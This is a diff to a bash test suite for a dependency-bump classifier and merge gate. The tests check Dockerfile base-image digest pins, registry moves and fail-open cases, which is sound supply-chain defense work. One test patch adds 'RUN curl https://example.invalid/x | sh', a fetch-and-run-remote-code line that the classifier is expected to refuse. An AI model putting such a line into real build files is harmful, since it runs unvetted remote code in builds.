@@ -3451,6 +3451,74 @@ grep -q '"verdict": "refused"' <<<"$vout" \
     && ok "a bump that newly runs an install script goes to a human" \
     || bad "a package gaining an install script was waved through"
 
+# Dockerfile base images. sysknife pins its build images by manifest-list digest
+# so a moved tag cannot change the build, and Dependabot's docker ecosystem
+# bumps them. The classifier had no arm for that path, so every such bump was
+# refused as "not dependency metadata" and went to a human, which is how
+# sysknife#534 and #535 came to be waiting on an asserted receipt.
+cat > "$dp/docker.patch" <<'PATCH'
+diff --git a/Dockerfile b/Dockerfile
+--- a/Dockerfile
++++ b/Dockerfile
+@@ -6,7 +6,7 @@
+-FROM docker.io/library/rust:1-bookworm@sha256:9a73a5088750b4c95158ab26629c854c3d6fc4b173cb7bc8079ad252d8ed7bfa AS builder
++FROM docker.io/library/rust:1-bookworm@sha256:93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e AS builder
+PATCH
+vout="$(dep_case "$dp/docker.patch")"
+grep -q '"verdict": "dependency-bump"' <<<"$vout" \
+    && grep -q '93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e' <<<"$vout" \
+    && grep -q '"tag": "1-bookworm"' <<<"$vout" \
+    && ok "a base-image digest bump is a dependency bump and reports the image to verify" \
+    || bad "the Dockerfile digest bump was not reported for verification: $(tr -d '\n' <<<"$vout" | cut -c1-160)"
+
+# The pin is the whole control. A bump that leaves the image on a bare tag has
+# given up the property the digest was there for, whatever Dependabot titled it.
+cat > "$dp/docker-unpinned.patch" <<'PATCH'
+diff --git a/Dockerfile b/Dockerfile
+--- a/Dockerfile
++++ b/Dockerfile
+@@ -6,7 +6,7 @@
+-FROM docker.io/library/rust:1-bookworm@sha256:9a73a5088750b4c95158ab26629c854c3d6fc4b173cb7bc8079ad252d8ed7bfa AS builder
++FROM docker.io/library/rust:1-bookworm AS builder
+PATCH
+vout="$(dep_case "$dp/docker-unpinned.patch")"
+grep -q '"verdict": "refused"' <<<"$vout" \
+    && grep -q 'pinned by digest' <<<"$vout" \
+    && ok "a base image that stops being pinned by digest is refused" \
+    || bad "a Dockerfile dropping its digest pin passed as a dependency bump"
+
+# Claim 2 of the three this classifier makes: no new place to download from.
+cat > "$dp/docker-registry-move.patch" <<'PATCH'
+diff --git a/Dockerfile b/Dockerfile
+--- a/Dockerfile
++++ b/Dockerfile
+@@ -6,7 +6,7 @@
+-FROM docker.io/library/rust:1-bookworm@sha256:9a73a5088750b4c95158ab26629c854c3d6fc4b173cb7bc8079ad252d8ed7bfa AS builder
++FROM ghcr.io/someone/rust:1-bookworm@sha256:93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e AS builder
+PATCH
+vout="$(dep_case "$dp/docker-registry-move.patch")"
+grep -q '"verdict": "refused"' <<<"$vout" \
+    && grep -q 'comes from a different image' <<<"$vout" \
+    && ok "a base image that moves to another registry is refused" \
+    || bad "a Dockerfile repointed at another registry passed as a dependency bump"
+
+# Everything that is not a FROM line. A digest bump riding alongside a new RUN
+# is the shape that makes the whole class dangerous to wave through.
+cat > "$dp/docker-run.patch" <<'PATCH'
+diff --git a/Dockerfile b/Dockerfile
+--- a/Dockerfile
++++ b/Dockerfile
+@@ -6,7 +6,8 @@
+-FROM docker.io/library/rust:1-bookworm@sha256:9a73a5088750b4c95158ab26629c854c3d6fc4b173cb7bc8079ad252d8ed7bfa AS builder
++FROM docker.io/library/rust:1-bookworm@sha256:93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e AS builder
++RUN curl https://example.invalid/x | sh
+PATCH
+vout="$(dep_case "$dp/docker-run.patch")"
+grep -q '"verdict": "refused"' <<<"$vout" \
+    && grep -q 'not a base image pin' <<<"$vout" \
+    && ok "a Dockerfile line that is not a base image pin is refused" \
+    || bad "an added RUN rode along with a base image bump"
+
 # And the gate has to spend that classification: a dependency receipt is one an
 # unattended run may merge on, because the gate observed the checks itself.
 grep -q 'verify-deps' "$root/bin/maintainer-merge" \
@@ -3535,8 +3603,21 @@ dep_gate() {  # $1 = patch file, $2 = what `gh api .../commits/<tag>` answers
     esac"
     PATH="$stub_dir:$PATH" MAINTAINER_STATE="$dep_state" MAINTAINER_ACCOUNT=testuser \
         MAINTAINER_SLUG=o/r MAINTAINER_REPO="$stub_dir/repo" \
-        MAINTAINER_SCRIPTS="$root/scripts" \
+        MAINTAINER_SCRIPTS="${DEP_SCRIPTS:-$root/scripts}" \
+        MAINTAINER_IMAGE_RESOLVER="${DEP_RESOLVER:-$root/scripts/resolve_image_digest.py}" \
         bash "$root/bin/maintainer-merge" verify-deps 9 cafe1234cafe1234 2>&1
+}
+
+# A resolver that answers without a network, so the suite stays offline. $1 is
+# what the registry is pretending to say; empty means it could not be reached.
+fake_resolver() {  # $1 = digest to answer, or "" to fail
+    local f="$stub_dir/resolver-$RANDOM.py"
+    if [ -n "$1" ]; then
+        printf 'print("%s")\n' "$1" > "$f"
+    else
+        printf 'import sys\nsys.stderr.write("registry unreachable\\n")\nraise SystemExit(1)\n' > "$f"
+    fi
+    printf '%s' "$f"
 }
 dout="$(dep_gate "$dp/pin.patch" 76c2e6406e52637deed7160d77bded76bd83e06e)"; drc=$?
 if [ "$drc" = 0 ] && [ -f "$dep_state/receipts/9.json" ] \
@@ -3558,6 +3639,63 @@ if [ "$drc" != 0 ] && grep -qi 'not a pure dependency bump' <<<"$dout"; then
 else
     bad "verify-deps accepted a source change (rc=$drc)"
 fi
+
+# The Dockerfile half, end to end. The digest is checked against what the tag
+# resolves to right now, for the same reason an action pin's comment is checked
+# against GitHub: a pin that names something it is not on reads correctly and
+# points somewhere else.
+good_digest=sha256:93ce27a88655056a51dbdd8f5f2d7ddc071c7b0070fb288a37b5a285fc83971e
+DEP_RESOLVER="$(fake_resolver "$good_digest")"
+dout="$(dep_gate "$dp/docker.patch" unused)"; drc=$?
+if [ "$drc" = 0 ] && [ -f "$dep_state/receipts/9.json" ] \
+   && grep -q '"images_verified": 1' "$dep_state/receipts/9.json"; then
+    ok "verify-deps writes a receipt when the base image digest is what its tag resolves to"
+else
+    bad "a clean base image bump earned no receipt (rc=$drc): $(tr -d '\n' <<<"$dout" | cut -c1-160)"
+fi
+
+DEP_RESOLVER="$(fake_resolver sha256:0000000000000000000000000000000000000000000000000000000000000000)"
+dout="$(dep_gate "$dp/docker.patch" unused)"; drc=$?
+if [ "$drc" != 0 ] && grep -q 'not the tag it claims' <<<"$dout" \
+   && [ ! -f "$dep_state/receipts/9.json" ]; then
+    ok "verify-deps refuses a base image digest the registry does not name"
+else
+    bad "a digest belonging to another image earned a receipt (rc=$drc)"
+fi
+
+# Rule 6: could-not-ask is not an all-clear. An unreachable registry has to stop
+# the receipt, because "no objection" and "no answer" are the same silence.
+DEP_RESOLVER="$(fake_resolver "")"
+dout="$(dep_gate "$dp/docker.patch" unused)"; drc=$?
+if [ "$drc" != 0 ] && grep -q 'could not ask the registry' <<<"$dout" \
+   && [ ! -f "$dep_state/receipts/9.json" ]; then
+    ok "a registry it could not reach refuses the receipt instead of passing it"
+else
+    bad "an unreachable registry was read as agreement (rc=$drc)"
+fi
+unset DEP_RESOLVER
+
+# And the fail-open the loops used to have. `while ... done < <(python3 ...)`
+# reports the redirection's status, so a producer that died left the loop with
+# nothing to read, the counter at zero, and a sealed receipt claiming the pins
+# were verified. The classifier here declares a pin it does not describe, which
+# is the one thing that makes the extractor die on real input.
+fake_scripts="$stub_dir/badscripts"; mkdir -p "$fake_scripts"
+cat > "$fake_scripts/classify_dependency_bump.py" <<'STUB'
+import json, sys
+sys.stdin.read()
+json.dump({"verdict": "dependency-bump", "files": {"a.yml": "workflow"},
+           "changed_lines": 2, "pins": [{"action": "o/r", "sha": "a" * 40}],
+           "images": []}, sys.stdout)
+STUB
+DEP_SCRIPTS="$fake_scripts"
+dout="$(dep_gate "$dp/pin.patch" unused)"; drc=$?
+if [ "$drc" != 0 ] && [ ! -f "$dep_state/receipts/9.json" ]; then
+    ok "a pin the gate could not read refuses the receipt, rather than counting zero"
+else
+    bad "a verdict whose pins could not be read still earned a receipt (rc=$drc)"
+fi
+unset DEP_SCRIPTS
 rm -f "$stub_dir/gh"
 grep -qE 'observed\|dependency|dependency\|observed' "$root/bin/maintainer-merge" \
     && ok "an unattended run may merge on a dependency receipt" \
